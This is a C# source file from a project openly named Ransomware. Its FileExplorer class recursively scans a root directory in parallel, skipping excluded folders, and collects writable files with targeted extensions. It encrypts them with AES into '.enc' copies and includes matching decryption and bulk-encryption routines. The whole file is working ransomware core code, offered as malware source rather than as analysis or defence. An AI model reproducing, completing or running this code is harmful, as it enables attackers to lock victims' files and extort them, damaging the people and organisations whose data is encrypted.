// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using Ransomware.Sources.Utils;
using System.Collections.Concurrent;

namespace Ransomware.Sources.Application;
class FileExplorer
{
    private bool isRunning;
    private readonly AesCipher aesCipher;
    private readonly ParallelOptions parallelOptions;
    private readonly HashSet<string> excludedDirectories;
    private readonly HashSet<string> allowedFileExtensions;
    public ConcurrentBag<FileDetail> SpecificFiles { get; private set; }

    public FileExplorer(AesCipher aesCipher)
    {
        this.isRunning = true;
        this.aesCipher = aesCipher;
        this.allowedFileExtensions = Config.Extensions();
        this.SpecificFiles = new ConcurrentBag<FileDetail>();
        this.excludedDirectories = new HashSet<string>(Config.ExcludedDirectories());
        this.parallelOptions = new ParallelOptions
        {
            MaxDegreeOfParallelism = Environment.ProcessorCount / 2
        };

    }

    private bool IsWritable(string path)
    {
        try
        {
            if (File.Exists(path))
            {
                using FileStream fs = File.Open(path, FileMode.Open, FileAccess.Write);
                return true;
            }
            if (Directory.Exists(path))
            {
                return !new DirectoryInfo(path).Attributes.HasFlag(FileAttributes.ReadOnly);
            }
        }
        catch (UnauthorizedAccessException) { return false; }
        catch (IOException) { return false; }
        return false;
    }

    private void FindFiles(string path)
    {
        try
        {
            // Kiểm tra xem thư mục có nằm trong danh sách bị loại trừ không
            if (this.excludedDirectories.Contains(path) || this.excludedDirectories.Any(path.StartsWith)) return;

            // Lấy danh sách tệp tin trong thư mục
            var files = Directory.EnumerateFiles(path)
                .Where(file => this.allowedFileExtensions.Contains(Path.GetExtension(file)))
                .ToList();

            // Xử lý tệp tin trong thư mục
            Parallel.ForEach(files, this.parallelOptions, file =>
            {
                if (IsWritable(file))
                {
                    long fileSize = new FileInfo(file).Length;
                    SpecificFiles.Add(new FileDetail(file, fileSize));
                }
            });

            // Lấy danh sách thư mục con trong thư mục
            var directories = Directory.EnumerateDirectories(path)
                .Where(dir => !excludedDirectories.Any(dir.StartsWith))
                .ToList();

            // Xử lý các thư mục con bằng cách gọi đệ quy
            Parallel.ForEach(directories, FindFiles); // Gọi trực tiếp phương thức
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine($"Không có quyền truy cập vào {path}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Lỗi: {ex.Message}");
        }
    }

    public void EncryptFile(string filePath, long fileSize)
    {
        string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
        string directoryName = Path.GetDirectoryName(filePath) ?? string.Empty;
        string outputPath = Path.Combine(directoryName, $"{fileNameWithoutExtension}.enc");

        int bufferSize = (int)Math.Min(fileSize, 8192);

        using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Read);
        using FileStream outputFileStream = new(outputPath, FileMode.Create, FileAccess.Write);
        using BufferedStream bufferedOutputStream = new(outputFileStream); // Sử dụng BufferedStream

        byte[] buffer = new byte[bufferSize];
        int bytesRead;

        while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
        {
            // Mã hóa dữ liệu với byte array
            byte[] encryptedData = this.aesCipher.Encrypt(buffer.AsSpan(0, bytesRead).ToArray());
            bufferedOutputStream.Write(encryptedData, 0, encryptedData.Length); // Ghi vào BufferedStream
        }
    }

    public void DecryptFile(string filePath, long fileSize)
    {
        string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
        string directoryName = Path.GetDirectoryName(filePath) ?? string.Empty;
        string outputPath = Path.Combine(directoryName, fileNameWithoutExtension);

        int bufferSize = (int)Math.Min(fileSize, 8192);

        using FileStream inputFileStream = new(filePath, FileMode.Open, FileAccess.Read);
        using FileStream outputFileStream = new(outputPath, FileMode.Create, FileAccess.Write);

        byte[] buffer = new byte[bufferSize];
        int bytesRead;

        while ((bytesRead = inputFileStream.Read(buffer, 0, buffer.Length)) > 0)
        {
            // Giải mã dữ liệu
            byte[] decryptedData = this.aesCipher.Decrypt(buffer.AsSpan(0, bytesRead).ToArray());
            outputFileStream.Write(decryptedData, 0, decryptedData.Length); // Ghi trực tiếp byte array
        }
    }

    public void EncryptMultipleFiles(IEnumerable<string> filePaths)
    {
        Parallel.ForEach(filePaths, this.parallelOptions, filePath =>
        {
            EncryptFile(filePath, new FileInfo(filePath).Length);
        });
    }

    public List<FileDetail> Scan(long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending)
    {
        if (this.isRunning)
        {
            FindFiles(Config.Root());
            this.isRunning = false;
        }

        return sortOrder == SortOrder.Descending
            ? this.SpecificFiles.Where(file => file.Size > minimumSize).OrderByDescending(file => file.Size).ToList()
            : this.SpecificFiles.Where(file => file.Size > minimumSize).OrderBy(file => file.Size).ToList();
    }

    public enum SortOrder
    {
        Ascending,
        Descending
    }
}
